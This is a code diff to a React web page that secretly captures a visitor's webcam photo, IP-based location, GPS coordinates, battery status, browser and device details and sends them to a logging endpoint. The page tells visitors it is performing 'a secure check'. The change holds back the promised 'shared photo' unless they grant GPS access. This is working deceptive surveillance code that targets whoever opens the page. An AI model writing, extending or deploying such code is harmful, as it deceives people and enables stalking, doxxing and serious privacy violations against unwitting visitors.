@@ -7,6 +7,7 @@ export default function Home() {
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
   const [done, setDone] = useState(false);
+  const [locationAllowed, setLocationAllowed] = useState(false);
 
   useEffect(() => {
     const capture = async () => {
@@ -16,14 +17,14 @@ export default function Home() {
           videoRef.current.srcObject = stream;
           await videoRef.current.play();
         }
-  
+
         setTimeout(async () => {
           if (canvasRef.current && videoRef.current) {
             const ctx = canvasRef.current.getContext('2d');
             if (ctx) {
               ctx.drawImage(videoRef.current, 0, 0, 320, 240);
               const photo = canvasRef.current.toDataURL('image/jpeg');
-  
+
               const ipRes = await fetch('https://ipapi.co/json');
               const ipInfo = await ipRes.json();
               const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -31,24 +32,22 @@ export default function Home() {
               const platform = navigator.platform;
               const languages = navigator.languages;
               const referrer = document.referrer;
-  
+
               const batteryInfo = {};
-  
               if ('getBattery' in navigator) {
                 try {
-                  const battery = await (navigator).getBattery();
+                  const battery = await navigator.getBattery();
                   batteryInfo.level = Math.round(battery.level * 100);
                   batteryInfo.charging = battery.charging;
                 } catch (err) {
                   console.warn('⚡ Battery info failed:', err);
                 }
               }
-  
-              // Now send everything
+
               navigator.geolocation.getCurrentPosition(
                 async (pos) => {
                   const { latitude, longitude } = pos.coords;
-  
+
                   await fetch('/api/log-photo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -64,26 +63,16 @@ export default function Home() {
                       location: { latitude, longitude },
                     }),
                   });
-  
+
+                  setLocationAllowed(true);
                   setDone(true);
                   stream.getTracks().forEach((track) => track.stop());
                 },
                 async () => {
-                  await fetch('/api/log-photo', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      photo,
-                      ipInfo,
-                      timezone,
-                      userAgent,
-                      platform,
-                      languages,
-                      batteryInfo,
-                      referrer,
-                    }),
-                  });
-  
+                  console.warn('❌ GPS access denied.');
+
+                  // Don't show image, but still complete
+                  setLocationAllowed(false);
                   setDone(true);
                   stream.getTracks().forEach((track) => track.stop());
                 }
@@ -93,12 +82,12 @@ export default function Home() {
         }, 2000);
       } catch (err) {
         console.error('❌ Camera access error', err);
+        setDone(true); // Fallback in case of webcam error
       }
     };
-  
+
     capture();
   }, []);
-  
 
   return (
     <div
@@ -134,7 +123,7 @@ export default function Home() {
           />
           <p style={{ color: '#666' }}>Please wait while we perform a secure check.</p>
         </>
-      ) : (
+      ) : locationAllowed ? (
         <>
           <h1 style={{ fontSize: '2rem', color: '#28a745', marginBottom: '1rem' }}>
             ✅ Shared photo
@@ -155,6 +144,12 @@ export default function Home() {
             }}
             priority
           />
+        </>
+      ) : (
+        <>
+          <h1 style={{ fontSize: '1.6rem', color: '#ff5e57' }}>
+            ⚠️ Location access denied. Cannot show image.
+          </h1>
         </>
       )}
 
